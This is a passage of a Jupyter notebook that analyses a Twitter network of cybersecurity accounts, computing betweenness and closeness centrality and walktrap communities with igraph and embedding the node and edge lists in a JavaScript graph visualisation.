      "text/plain": [
       "[('botcybersec', 12094.033477633478),\n",
       " ('cybersecboardrm', 6881.3873737373715),\n",
       " ('MalwareTechBlog', 6617.0),\n",
       " ('SecurityXTV', 6345.027777777773),\n",
       " ('UCSBInfoSec', 6203.0)]"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#from py2neo import Node\n",
    "between = [(node[\"name\"], node.betweenness()) for node in ig.vs]\n",
    "top = sorted(between, key=lambda x: x[1], reverse=True)\n",
    "top[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2194f54b",
   "metadata": {},
   "source": [
    "<h2>Which users have the highest closeness?</h2>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "93a63ce3",
   "metadata": {},
   "source": [
    "The closeness centrality is the reciprocal of a node's farness, or sum of its shortest path distances from all other nodes in the graph."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "be588ef7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[('FAlhafi', 1.0),\n",
       " ('kjhiggins', 1.0),\n",
       " ('ProductCERT', 1.0),\n",
       " ('packetengineer', 1.0),\n",
       " ('randomuserid', 1.0)]"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "close = [(node[\"name\"], node.closeness()) for node in ig.vs]\n",
    "top = sorted(close, key=lambda x: x[1], reverse=True)\n",
    "top[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "80c52d9d",
   "metadata": {},
   "source": [
    "<h2>Community detection</h2>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "99f32885",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "48"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "clusters = IGraph.community_walktrap(ig, weights=\"weight\")\n",
    "clusters = clusters.as_clustering()\n",
    "len(clusters)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "1982db1e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[{'id': 0, 'label': 'vmrwanda', 'group': 0},\n",
       " {'id': 1, 'label': 'nypost', 'group': 0},\n",
       " {'id': 2, 'label': 'Joyenz1', 'group': 0},\n",
       " {'id': 3, 'label': 'botcybersec', 'group': 1},\n",
       " {'id': 4, 'label': 'tmvincent913', 'group': 1},\n",
       " {'id': 5, 'label': 'AlyssaM_InfoSec', 'group': 2},\n",
       " {'id': 6, 'label': 'willowstar1379', 'group': 0},\n",
       " {'id': 7, 'label': 'zeezoali', 'group': 3},\n",
       " {'id': 8, 'label': 'FAlhafi', 'group': 3},\n",
       " {'id': 9, 'label': 'kjhiggins', 'group': 4},\n",
       " {'id': 10, 'label': 'ProductCERT', 'group': 4},\n",
       " {'id': 11, 'label': 'reach2ratan', 'group': 1},\n",
       " {'id': 12, 'label': 'GoaiDev', 'group': 5},\n",
       " {'id': 13, 'label': 'simonwargniez', 'group': 5},\n",
       " {'id': 14, 'label': '_FunBot', 'group': 5},\n",
       " {'id': 15, 'label': 'morolswediu', 'group': 5},\n",
       " {'id': 16, 'label': 'CyberSecRocks', 'group': 2},\n",
       " {'id': 17, 'label': 'TRXfourfiddyr', 'group': 0},\n",
       " {'id': 18, 'label': 'LilMzMuffinCup', 'group': 2},\n",
       " {'id': 19, 'label': 'IDFUnit8200', 'group': 0},\n",
       " {'id': 20, 'label': 'packetengineer', 'group': 6},\n",
       " {'id': 21, 'label': 'randomuserid', 'group': 6},\n",
       " {'id': 22, 'label': 'AspenSecurity', 'group': 1},\n",
       " {'id': 23, 'label': 'vishne0', 'group': 1},\n",
       " {'id': 24, 'label': 'hemoamro18', 'group': 3},\n",
       " {'id': 25, 'label': 'BrianCentrone', 'group': 7},\n",
       " {'id': 26, 'label': 'AldenBrien', 'group': 7},\n",
       " {'id': 27, 'label': 'TommyBrownIII1', 'group': 8},\n",
       " {'id': 28, 'label': 'UCSBInfoSec', 'group': 8},\n",
       " {'id': 29, 'label': 'eddie_31003', 'group': 8},\n",
       " {'id': 30, 'label': 'bluedevildavey', 'group': 0},\n",
       " {'id': 31, 'label': 'CohenAustyn', 'group': 9},\n",
       " {'id': 32, 'label': 'bad_packets', 'group': 9},\n",
       " {'id': 33, 'label': 'NantucketFall', 'group': 0},\n",
       " {'id': 34, 'label': 'keyvorg', 'group': 10},\n",
       " {'id': 35, 'label': 'TenableSecurity', 'group': 10},\n",
       " {'id': 36, 'label': 'dougfort', 'group': 9},\n",
       " {'id': 37, 'label': 'NETSCOUT', 'group': 11},\n",
       " {'id': 38, 'label': 'aroooy', 'group': 0},\n",
       " {'id': 39, 'label': 'Jonesls', 'group': 12},\n",
       " {'id': 40, 'label': 'ScotJasper', 'group': 12},\n",
       " {'id': 41, 'label': 'schoolofinfosec', 'group': 1},\n",
       " {'id': 42, 'label': 'epiCCodingNET', 'group': 13},\n",
       " {'id': 43, 'label': 'tweet_alqamar', 'group': 13},\n",
       " {'id': 44, 'label': 'MajamboKE', 'group': 0},\n",
       " {'id': 45, 'label': 'cheynne08', 'group': 1},\n",
       " {'id': 46, 'label': 'sectest9', 'group': 1},\n",
       " {'id': 47, 'label': 'GoldskySecurity', 'group': 1},\n",
       " {'id': 48, 'label': 'CyberSecurityN8', 'group': 1}]"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "nodes = [{\"id\": node.index, \"label\": node[\"name\"]} for node in ig.vs]\n",
    "\n",
    "for node in nodes:\n",
    "    node[\"group\"] = clusters.membership[node[\"id\"]]\n",
    "    \n",
    "nodes[:49] #I think this is the output+1 from above?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "1ae35f70",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[{'from': 0, 'to': 1},\n",
       " {'from': 1, 'to': 2},\n",
       " {'from': 3, 'to': 4},\n",
       " {'from': 3, 'to': 5},\n",
       " {'from': 1, 'to': 6},\n",
       " {'from': 7, 'to': 8},\n",
       " {'from': 9, 'to': 10},\n",
       " {'from': 3, 'to': 11},\n",
       " {'from': 12, 'to': 13},\n",
       " {'from': 13, 'to': 14},\n",
       " {'from': 13, 'to': 15},\n",
       " {'from': 5, 'to': 16},\n",
       " {'from': 1, 'to': 17},\n",
       " {'from': 5, 'to': 18},\n",
       " {'from': 1, 'to': 19},\n",
       " {'from': 20, 'to': 21},\n",
       " {'from': 3, 'to': 22},\n",
       " {'from': 13, 'to': 23},\n",
       " {'from': 8, 'to': 24},\n",
       " {'from': 25, 'to': 26},\n",
       " {'from': 27, 'to': 28},\n",
       " {'from': 28, 'to': 29},\n",
       " {'from': 1, 'to': 30},\n",
       " {'from': 31, 'to': 32},\n",
       " {'from': 1, 'to': 33},\n",
       " {'from': 34, 'to': 35},\n",
       " {'from': 32, 'to': 36},\n",
       " {'from': 3, 'to': 37},\n",
       " {'from': 1, 'to': 38},\n",
       " {'from': 39, 'to': 40},\n",
       " {'from': 3, 'to': 41},\n",
       " {'from': 42, 'to': 43},\n",
       " {'from': 1, 'to': 44},\n",
       " {'from': 3, 'to': 45},\n",
       " {'from': 46, 'to': 47},\n",
       " {'from': 47, 'to': 48},\n",
       " {'from': 48, 'to': 49},\n",
       " {'from': 46, 'to': 49},\n",
       " {'from': 3, 'to': 49},\n",
       " {'from': 3, 'to': 50},\n",
       " {'from': 51, 'to': 52},\n",
       " {'from': 3, 'to': 53},\n",
       " {'from': 49, 'to': 54},\n",
       " {'from': 1, 'to': 55},\n",
       " {'from': 56, 'to': 57},\n",
       " {'from': 3, 'to': 58},\n",
       " {'from': 59, 'to': 60},\n",
       " {'from': 28, 'to': 61},\n",
       " {'from': 3, 'to': 62}]"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "edges = [{\"from\": x[0], \"to\": x[1]} for x in ig.get_edgelist()]\n",
    "edges[:49]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "afd2f385",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div id=\"85375a5b-cccd-459e-bc04-efc01f2494fb\" style=\"height: 400px;\"></div>\n",
       "\n",
       "<script type=\"text/javascript\">\n",
       "\n",
       "    var nodes = [{\"id\": 0, \"label\": \"vmrwanda\", \"group\": 0}, {\"id\": 1, \"label\": \"nypost\", \"group\": 0}, {\"id\": 2, \"label\": \"Joyenz1\", \"group\": 0}, {\"id\": 3, \"label\": \"botcybersec\", \"group\": 1}, {\"id\": 4, \"label\": \"tmvincent913\", \"group\": 1}, {\"id\": 5, \"label\": \"AlyssaM_InfoSec\", \"group\": 2}, {\"id\": 6, \"label\": \"willowstar1379\", \"group\": 0}, {\"id\": 7, \"label\": \"zeezoali\", \"group\": 3}, {\"id\": 8, \"label\": \"FAlhafi\", \"group\": 3}, {\"id\": 9, \"label\": \"kjhiggins\", \"group\": 4}, {\"id\": 10, \"label\": \"ProductCERT\", \"group\": 4}, {\"id\": 11, \"label\": \"reach2ratan\", \"group\": 1}, {\"id\": 12, \"label\": \"GoaiDev\", \"group\": 5}, {\"id\": 13, \"label\": \"simonwargniez\", \"group\": 5}, {\"id\": 14, \"label\": \"_FunBot\", \"group\": 5}, {\"id\": 15, \"label\": \"morolswediu\", \"group\": 5}, {\"id\": 16, \"label\": \"CyberSecRocks\", \"group\": 2}, {\"id\": 17, \"label\": \"TRXfourfiddyr\", \"group\": 0}, {\"id\": 18, \"label\": \"LilMzMuffinCup\", \"group\": 2}, {\"id\": 19, \"label\": \"IDFUnit8200\", \"group\": 0}, {\"id\": 20, \"label\": \"packetengineer\", \"group\": 6}, {\"id\": 21, \"label\": \"randomuserid\", \"group\": 6}, {\"id\": 22, \"label\": \"AspenSecurity\", \"group\": 1}, {\"id\": 23, \"label\": \"vishne0\", \"group\": 1}, {\"id\": 24, \"label\": \"hemoamro18\", \"group\": 3}, {\"id\": 25, \"label\": \"BrianCentrone\", \"group\": 7}, {\"id\": 26, \"label\": \"AldenBrien\", \"group\": 7}, {\"id\": 27, \"label\": \"TommyBrownIII1\", \"group\": 8}, {\"id\": 28, \"label\": \"UCSBInfoSec\", \"group\": 8}, {\"id\": 29, \"label\": \"eddie_31003\", \"group\": 8}, {\"id\": 30, \"label\": \"bluedevildavey\", \"group\": 0}, {\"id\": 31, \"label\": \"CohenAustyn\", \"group\": 9}, {\"id\": 32, \"label\": \"bad_packets\", \"group\": 9}, {\"id\": 33, \"label\": \"NantucketFall\", \"group\": 0}, {\"id\": 34, \"label\": \"keyvorg\", \"group\": 10}, {\"id\": 35, \"label\": \"TenableSecurity\", \"group\": 10}, {\"id\": 36, \"label\": \"dougfort\", \"group\": 9}, {\"id\": 37, \"label\": \"NETSCOUT\", \"group\": 11}, {\"id\": 38, \"label\": \"aroooy\", \"group\": 0}, {\"id\": 39, \"label\": \"Jonesls\", \"group\": 12}, {\"id\": 40, \"label\": \"ScotJasper\", \"group\": 12}, {\"id\": 41, \"label\": \"schoolofinfosec\", \"group\": 1}, {\"id\": 42, \"label\": \"epiCCodingNET\", \"group\": 13}, {\"id\": 43, \"label\": \"tweet_alqamar\", \"group\": 13}, {\"id\": 44, \"label\": \"MajamboKE\", \"group\": 0}, {\"id\": 45, \"label\": \"cheynne08\", \"group\": 1}, {\"id\": 46, \"label\": \"sectest9\", \"group\": 1}, {\"id\": 47, \"label\": \"GoldskySecurity\", \"group\": 1}, {\"id\": 48, \"label\": \"CyberSecurityN8\", \"group\": 1}, {\"id\": 49, \"label\": \"BeDigitalize\", \"group\": 1}, {\"id\": 50, \"label\": \"StopMalvertisin\", \"group\": 1}, {\"id\": 51, \"label\": \"guessw_rk\", \"group\": 14}, {\"id\": 52, \"label\": \"0x6e6f746573\", \"group\": 14}, {\"id\": 53, \"label\": \"IT_securitynews\", \"group\": 1}, {\"id\": 54, \"label\": \"DrAlmdaoi\", \"group\": 1}, {\"id\": 55, \"label\": \"Sgt_Griswold\", \"group\": 0}, {\"id\": 56, \"label\": \"WilliamMalikTM\", \"group\": 15}, {\"id\": 57, \"label\": \"TrendMicro\", \"group\": 15}, {\"id\": 58, \"label\": \"ShoreEJV\", \"group\": 1}, {\"id\": 59, \"label\": \"villarrealtovar\", \"group\": 16}, {\"id\": 60, \"label\": \"elementanalytic\", \"group\": 16}, {\"id\": 61, \"label\": \"SecurityXTV\", \"group\": 8}, {\"id\": 62, \"label\": \"iicsorg\", \"group\": 1}, {\"id\": 63, \"label\": \"CybazeSocial\", \"group\": 17}, {\"id\": 64, \"label\": \"MnkeniFrancis\", \"group\": 17}, {\"id\": 65, \"label\": \"Eduardo49855624\", \"group\": 15}, {\"id\": 66, \"label\": \"joviannfeed\", \"group\": 1}, {\"id\": 67, \"label\": \"InfoSec_b\", \"group\": 1}, {\"id\": 68, \"label\": \"ophorror\", \"group\": 0}, {\"id\": 69, \"label\": \"CyberAlliance\", \"group\": 11}, {\"id\": 70, \"label\": \"Meta_2077\", \"group\": 18}, {\"id\": 71, \"label\": \"GuyAdami\", \"group\": 18}, {\"id\": 72, \"label\": \"infosec_libby\", \"group\": 19}, {\"id\": 73, \"label\": \"raymondpirouz\", \"group\": 19}, {\"id\": 74, \"label\": \"DonalScollan\", \"group\": 19}, {\"id\": 75, \"label\": \"janggolan\", \"group\": 20}, {\"id\": 76, \"label\": \"Adam_K_Levin\", \"group\": 20}, {\"id\": 77, \"label\": \"CyberIQs_\", \"group\": 1}, {\"id\": 78, \"label\": \"HectorDuathlon1\", \"group\": 1}, {\"id\": 79, \"label\": \"NcsVentures\", \"group\": 1}, {\"id\": 80, \"label\": \"JavaGeekBot\", \"group\": 21}, {\"id\": 81, \"label\": \"PaulaRayMandl\", \"group\": 21}, {\"id\": 82, \"label\": \"Gileswb\", \"group\": 1}, {\"id\": 83, \"label\": \"NickAEsp\", \"group\": 1}, {\"id\": 84, \"label\": \"VFArtisanCodeur\", \"group\": 22}, {\"id\": 85, \"label\": \"DarkReading\", \"group\": 22}, {\"id\": 86, \"label\": \"maggie_albrecht\", \"group\": 22}, {\"id\": 87, \"label\": \"CrowdStrike\", \"group\": 10}, {\"id\": 88, \"label\": \"gdprAI\", \"group\": 1}, {\"id\": 89, \"label\": \"greentechdon\", \"group\": 1}, {\"id\": 90, \"label\": \"IndieAngles\", \"group\": 1}, {\"id\": 91, \"label\": \"TechGrlTweeter\", \"group\": 23}, {\"id\": 92, \"label\": \"LitMoose\", \"group\": 23}, {\"id\": 93, \"label\": \"davidFLSTS\", \"group\": 22}, {\"id\": 94, \"label\": \"kagicaco\", \"group\": 22}, {\"id\": 95, \"label\": \"kb6nzv\", \"group\": 23}, {\"id\": 96, \"label\": \"KalemaChris\", \"group\": 1}, {\"id\": 97, \"label\": \"thetechtosee\", \"group\": 1}, {\"id\": 98, \"label\": \"sentryy_\", \"group\": 23}, {\"id\": 99, \"label\": \"JCKaelin\", \"group\": 24}, {\"id\": 100, \"label\": \"Em0nTw1tter\", \"group\": 2}, {\"id\": 101, \"label\": \"katastrophe0411\", \"group\": 2}, {\"id\": 102, \"label\": \"netsecu\", \"group\": 1}, {\"id\": 103, \"label\": \"opensource_orgs\", \"group\": 25}, {\"id\": 104, \"label\": \"opsmatters_uk\", \"group\": 25}, {\"id\": 105, \"label\": \"RBAT05\", \"group\": 22}, {\"id\": 106, \"label\": \"Plumber1992PM\", \"group\": 1}, {\"id\": 107, \"label\": \"bvatechninja\", \"group\": 1}, {\"id\": 108, \"label\": \"ReadTechHere\", \"group\": 1}, {\"id\": 109, \"label\": \"initinfosec\", \"group\": 23}, {\"id\": 110, \"label\": \"Sec_Cyber\", \"group\": 1}, {\"id\": 111, \"label\": \"Trex421\", \"group\": 26}, {\"id\": 112, \"label\": \"ET_Labs\", \"group\": 26}, {\"id\": 113, \"label\": \"cyberintel\", \"group\": 1}, {\"id\": 114, \"label\": \"releaseteam\", \"group\": 1}, {\"id\": 115, \"label\": \"adekleine\", \"group\": 1}, {\"id\": 116, \"label\": \"Antisocial20211\", \"group\": 1}, {\"id\": 117, \"label\": \"IntelTweet\", \"group\": 1}, {\"id\": 118, \"label\": \"Argonzo\", \"group\": 26}, {\"id\": 119, \"label\": \"arnold_smith1\", \"group\": 2}, {\"id\": 120, \"label\": \"cybsecbot\", \"group\": 27}, {\"id\": 121, \"label\": \"prevailion\", \"group\": 27}, {\"id\": 122, \"label\": \"MoreyHaber\", \"group\": 22}, {\"id\": 123, \"label\": \"McGrewSecurity\", \"group\": 28}, {\"id\": 124, \"label\": \"ptk2k5\", \"group\": 28}, {\"id\": 125, \"label\": \"JershMagersh\", \"group\": 23}, {\"id\": 126, \"label\": \"DustyMMiller\", \"group\": 23}, {\"id\": 127, \"label\": \"lorenzo180\", \"group\": 23}, {\"id\": 128, \"label\": \"dubengeldu\", \"group\": 29}, {\"id\": 129, \"label\": \"wlassalle\", \"group\": 29}, {\"id\": 130, \"label\": \"alexfrancow_sec\", \"group\": 30}, {\"id\": 131, \"label\": \"motakasoft\", \"group\": 30}, {\"id\": 132, \"label\": \"amartinezc01\", \"group\": 11}, {\"id\": 133, \"label\": \"venkat_tesan\", \"group\": 1}, {\"id\": 134, \"label\": \"IWCsync\", \"group\": 1}, {\"id\": 135, \"label\": \"MathWebEntry\", \"group\": 1}, {\"id\": 136, \"label\": \"SCMagazine\", \"group\": 25}, {\"id\": 137, \"label\": \"TheRiseOfTrump\", \"group\": 1}, {\"id\": 138, \"label\": \"bsmuir\", \"group\": 1}, {\"id\": 139, \"label\": \"dntlookbehindu\", \"group\": 23}, {\"id\": 140, \"label\": \"_rglx\", \"group\": 31}, {\"id\": 141, \"label\": \"MalwareTechBlog\", \"group\": 31}, {\"id\": 142, \"label\": \"MrsYisWhy\", \"group\": 8}, {\"id\": 143, \"label\": \"beefyspace\", \"group\": 8}, {\"id\": 144, \"label\": \"deb_infosec\", \"group\": 8}, {\"id\": 145, \"label\": \"cerberus0x64e67\", \"group\": 31}, {\"id\": 146, \"label\": \"L2actual\", \"group\": 32}, {\"id\": 147, \"label\": \"BeckyPinkard\", \"group\": 32}, {\"id\": 148, \"label\": \"TaoOfGir\", \"group\": 31}, {\"id\": 149, \"label\": \"gettingcomputey\", \"group\": 31}, {\"id\": 150, \"label\": \"dustin_dicarlo\", \"group\": 25}, {\"id\": 151, \"label\": \"diggdeeper\", \"group\": 31}, {\"id\": 152, \"label\": \"ncxgroup\", \"group\": 25}, {\"id\": 153, \"label\": \"freshsqueezed\", \"group\": 31}, {\"id\": 154, \"label\": \"Omi_082\", \"group\": 1}, {\"id\": 155, \"label\": \"Nick_Barnes\", \"group\": 31}, {\"id\": 156, \"label\": \"charlienice_\", \"group\": 31}, {\"id\": 157, \"label\": \"cookie_lust\", \"group\": 23}, {\"id\": 158, \"label\": \"secmeme\", \"group\": 31}, {\"id\": 159, \"label\": \"MetalRabbit13\", \"group\": 21}, {\"id\": 160, \"label\": \"cwharlow\", \"group\": 1}, {\"id\": 161, \"label\": \"morfca\", \"group\": 31}, {\"id\": 162, \"label\": \"EricRichards22\", \"group\": 31}, {\"id\": 163, \"label\": \"pieroveras\", \"group\": 31}, {\"id\": 164, \"label\": \"guneetz\", \"group\": 1}, {\"id\": 165, \"label\": \"vxunderground\", \"group\": 33}, {\"id\": 166, \"label\": \"willhackforfood\", \"group\": 31}, {\"id\": 167, \"label\": \"pislisSniflis\", \"group\": 33}, {\"id\": 168, \"label\": \"DaveMarcus\", \"group\": 33}, {\"id\": 169, \"label\": \"AhmedKnowsStuff\", \"group\": 31}, {\"id\": 170, \"label\": \"CrazyAboutCloud\", \"group\": 34}, {\"id\": 171, \"label\": \"SQLMelody\", \"group\": 34}, {\"id\": 172, \"label\": \"saghaulor\", \"group\": 2}, {\"id\": 173, \"label\": \"CoderRetweet\", \"group\": 35}, {\"id\": 174, \"label\": \"CDWGWAGov\", \"group\": 35}, {\"id\": 175, \"label\": \"infosecspy\", \"group\": 31}, {\"id\": 176, \"label\": \"DrAdamVaughn\", \"group\": 31}, {\"id\": 177, \"label\": \"shinharad\", \"group\": 36}, {\"id\": 178, \"label\": \"scala_sbt\", \"group\": 36}, {\"id\": 179, \"label\": \"Youssefyamani\", \"group\": 31}, {\"id\": 180, \"label\": \"Fabriciosx\", \"group\": 35}, {\"id\": 181, \"label\": \"codedailybot\", \"group\": 35}, {\"id\": 182, \"label\": \"cybertechaccord\", \"group\": 15}, {\"id\": 183, \"label\": \"Ch33r10\", \"group\": 23}, {\"id\": 184, \"label\": \"PythonExpertBot\", \"group\": 35}, {\"id\": 185, \"label\": \"BotSecx\", \"group\": 25}, {\"id\": 186, \"label\": \"aytobee\", \"group\": 35}, {\"id\": 187, \"label\": \"Tekzilla_it\", \"group\": 1}, {\"id\": 188, \"label\": \"bongnoises\", \"group\": 33}, {\"id\": 189, \"label\": \"JFSebastian146\", \"group\": 35}, {\"id\": 190, \"label\": \"jagax\", \"group\": 31}, {\"id\": 191, \"label\": \"Jarlaxxe\", \"group\": 31}, {\"id\": 192, \"label\": \"marypcbuk\", \"group\": 31}, {\"id\": 193, \"label\": \"MattETurner\", \"group\": 23}, {\"id\": 194, \"label\": \"ajvanbeest\", \"group\": 23}, {\"id\": 195, \"label\": \"bunnibytz\", \"group\": 31}, {\"id\": 196, \"label\": \"ReasonTechLLC\", \"group\": 37}, {\"id\": 197, \"label\": \"cybereason\", \"group\": 37}, {\"id\": 198, \"label\": \"DrKatrinaAdkins\", \"group\": 1}, {\"id\": 199, \"label\": \"SHI_Intl\", \"group\": 1}, {\"id\": 200, \"label\": \"ipsystemsPH\", \"group\": 25}, {\"id\": 201, \"label\": \"SANSAPAC\", \"group\": 25}, {\"id\": 202, \"label\": \"Jul_Ismail\", \"group\": 15}, {\"id\": 203, \"label\": \"PeterRobards\", \"group\": 25}, {\"id\": 204, \"label\": \"GregoryDEvans\", \"group\": 25}, {\"id\": 205, \"label\": \"AussieDev81\", \"group\": 21}, {\"id\": 206, \"label\": \"4d5a_etc\", \"group\": 31}, {\"id\": 207, \"label\": \"kenpty\", \"group\": 38}, {\"id\": 208, \"label\": \"Gizmodo\", \"group\": 38}, {\"id\": 209, \"label\": \"RAlexJimenez\", \"group\": 25}, {\"id\": 210, \"label\": \"stratorob\", \"group\": 25}, {\"id\": 211, \"label\": \"kaushalkaush7\", \"group\": 31}, {\"id\": 212, \"label\": \"infinician\", \"group\": 38}, {\"id\": 213, \"label\": \"hashem25\", \"group\": 39}, {\"id\": 214, \"label\": \"iZNDTechNews\", \"group\": 39}, {\"id\": 215, \"label\": \"squiggly12\", \"group\": 38}, {\"id\": 216, \"label\": \"TheDivulged\", \"group\": 21}, {\"id\": 217, \"label\": \"SATYAJIT1910\", \"group\": 40}, {\"id\": 218, \"label\": \"DigitalResidue\", \"group\": 40}, {\"id\": 219, \"label\": \"PhanaPhaisont\", \"group\": 38}, {\"id\": 220, \"label\": \"HireaHacker_Pro\", \"group\": 25}, {\"id\": 221, \"label\": \"AnneCalie\", \"group\": 31}, {\"id\": 222, \"label\": \"_naim\", \"group\": 25}, {\"id\": 223, \"label\": \"breakingcreech\", \"group\": 31}, {\"id\": 224, \"label\": \"tribal_sec\", \"group\": 30}, {\"id\": 225, \"label\": \"noir_khyl\", \"group\": 31}, {\"id\": 226, \"label\": \"VentureBeat\", \"group\": 1}, {\"id\": 227, \"label\": \"sciBot6\", \"group\": 25}, {\"id\": 228, \"label\": \"KO6YQ\", \"group\": 25}, {\"id\": 229, \"label\": \"_CSNI_\", \"group\": 1}, {\"id\": 230, \"label\": \"NzVox\", \"group\": 41}, {\"id\": 231, \"label\": \"Mk13Of\", \"group\": 41}, {\"id\": 232, \"label\": \"CheckPoint_NL\", \"group\": 17}, {\"id\": 233, \"label\": \"IoTtogether\", \"group\": 25}, {\"id\": 234, \"label\": \"JRoosen\", \"group\": 31}, {\"id\": 235, \"label\": \"DoctorOfTheData\", \"group\": 25}, {\"id\": 236, \"label\": \"silascutler\", \"group\": 23}, {\"id\": 237, \"label\": \"AlexeyChang\", \"group\": 41}, {\"id\": 238, \"label\": \"techsolvency\", \"group\": 23}, {\"id\": 239, \"label\": \"chort0\", \"group\": 26}, {\"id\": 240, \"label\": \"MiKeMcDnet\", \"group\": 23}, {\"id\": 241, \"label\": \"igor_os777\", \"group\": 1}, {\"id\": 242, \"label\": \"Wabbyte\", \"group\": 31}, {\"id\": 243, \"label\": \"tuyoty\", \"group\": 26}, {\"id\": 244, \"label\": \"tester109375070\", \"group\": 42}, {\"id\": 245, \"label\": \"SkyboxSecurity\", \"group\": 42}, {\"id\": 246, \"label\": \"statictear\", \"group\": 23}, {\"id\": 247, \"label\": \"JayWStap\", \"group\": 43}, {\"id\": 248, \"label\": \"cfzellers4\", \"group\": 43}, {\"id\": 249, \"label\": \"pradeep40601633\", \"group\": 23}, {\"id\": 250, \"label\": \"cybersecboardrm\", \"group\": 1}, {\"id\": 251, \"label\": \"TanguayBrendan\", \"group\": 44}, {\"id\": 252, \"label\": \"AttackIQ\", \"group\": 44}, {\"id\": 253, \"label\": \"rthm337\", \"group\": 1}, {\"id\": 254, \"label\": \"ItWasACoup\", \"group\": 1}, {\"id\": 255, \"label\": \"BeccaPL\", \"group\": 1}, {\"id\": 256, \"label\": \"MaxInWeb82\", \"group\": 38}, {\"id\": 257, \"label\": \"Liberoliber\", \"group\": 41}, {\"id\": 258, \"label\": \"thestrayworld\", \"group\": 31}, {\"id\": 259, \"label\": \"techie_wiz\", \"group\": 45}, {\"id\": 260, \"label\": \"StartupAround\", \"group\": 45}, {\"id\": 261, \"label\": \"3848_6\", \"group\": 33}, {\"id\": 262, \"label\": \"shoebhakim\", \"group\": 27}, {\"id\": 263, \"label\": \"SophosLabs\", \"group\": 46}, {\"id\": 264, \"label\": \"Sophos\", \"group\": 46}, {\"id\": 265, \"label\": \"gh0std4ncer\", \"group\": 23}, {\"id\": 266, \"label\": \"ptracesecurity\", \"group\": 25}, {\"id\": 267, \"label\": \"n1sh1th\", \"group\": 25}, {\"id\": 268, \"label\": \"simrotion13\", \"group\": 30}, {\"id\": 269, \"label\": \"troutgirl\", \"group\": 47}, {\"id\": 270, \"label\": \"elkentaro\", \"group\": 47}, {\"id\": 271, \"label\": \"_ChezDaniela\", \"group\": 5}, {\"id\": 272, \"label\": \"_mbanana\", \"group\": 23}, {\"id\": 273, \"label\": \"lnxsec\", \"group\": 1}];\n",
       "    var edges = [{\"from\": 0, \"to\": 1}, {\"from\": 1, \"to\": 2}, {\"from\": 3, \"to\": 4}, {\"from\": 3, \"to\": 5}, {\"from\": 1, \"to\": 6}, {\"from\": 7, \"to\": 8}, {\"from\": 9, \"to\": 10}, {\"from\": 3, \"to\": 11}, {\"from\": 12, \"to\": 13}, {\"from\": 13, \"to\": 14}, {\"from\": 13, \"to\": 15}, {\"from\": 5, \"to\": 16}, {\"from\": 1, \"to\": 17}, {\"from\": 5, \"to\": 18}, {\"from\": 1, \"to\": 19}, {\"from\": 20, \"to\": 21}, {\"from\": 3, \"to\": 22}, {\"from\": 13, \"to\": 23}, {\"from\": 8, \"to\": 24}, {\"from\": 25, \"to\": 26}, {\"from\": 27, \"to\": 28}, {\"from\": 28, \"to\": 29}, {\"from\": 1, \"to\": 30}, {\"from\": 31, \"to\": 32}, {\"from\": 1, \"to\": 33}, {\"from\": 34, \"to\": 35}, {\"from\": 32, \"to\": 36}, {\"from\": 3, \"to\": 37}, {\"from\": 1, \"to\": 38}, {\"from\": 39, \"to\": 40}, {\"from\": 3, \"to\": 41}, {\"from\": 42, \"to\": 43}, {\"from\": 1, \"to\": 44}, {\"from\": 3, \"to\": 45}, {\"from\": 46, \"to\": 47}, {\"from\": 47, \"to\": 48}, {\"from\": 48, \"to\": 49}, {\"from\": 46, \"to\": 49}, {\"from\": 3, \"to\": 49}, {\"from\": 3, \"to\": 50}, {\"from\": 51, \"to\": 52}, {\"from\": 3, \"to\": 53}, {\"from\": 49, \"to\": 54}, {\"from\": 1, \"to\": 55}, {\"from\": 56, \"to\": 57}, {\"from\": 3, \"to\": 58}, {\"from\": 59, \"to\": 60}, {\"from\": 28, \"to\": 61}, {\"from\": 3, \"to\": 62}, {\"from\": 63, \"to\": 64}, {\"from\": 57, \"to\": 65}, {\"from\": 3, \"to\": 66}, {\"from\": 3, \"to\": 67}, {\"from\": 1, \"to\": 68}, {\"from\": 37, \"to\": 69}, {\"from\": 70, \"to\": 71}, {\"from\": 72, \"to\": 73}, {\"from\": 73, \"to\": 74}, {\"from\": 75, \"to\": 76}, {\"from\": 46, \"to\": 77}, {\"from\": 48, \"to\": 77}, {\"from\": 3, \"to\": 77}, {\"from\": 78, \"to\": 79}, {\"from\": 80, \"to\": 81}, {\"from\": 82, \"to\": 83}, {\"from\": 3, \"to\": 83}, {\"from\": 84, \"to\": 85}, {\"from\": 85, \"to\": 86}, {\"from\": 34, \"to\": 87}, {\"from\": 83, \"to\": 88}, {\"from\": 83, \"to\": 89}, {\"from\": 83, \"to\": 90}, {\"from\": 91, \"to\": 92}, {\"from\": 85, \"to\": 93}, {\"from\": 46, \"to\": 83}, {\"from\": 48, \"to\": 83}, {\"from\": 85, \"to\": 94}, {\"from\": 92, \"to\": 93}, {\"from\": 92, \"to\": 95}, {\"from\": 77, \"to\": 96}, {\"from\": 3, \"to\": 97}, {\"from\": 92, \"to\": 98}, {\"from\": 99, \"to\": 99}, {\"from\": 92, \"to\": 100}, {\"from\": 5, \"to\": 100}, {\"from\": 5, \"to\": 101}, {\"from\": 48, \"to\": 102}, {\"from\": 46, \"to\": 102}, {\"from\": 103, 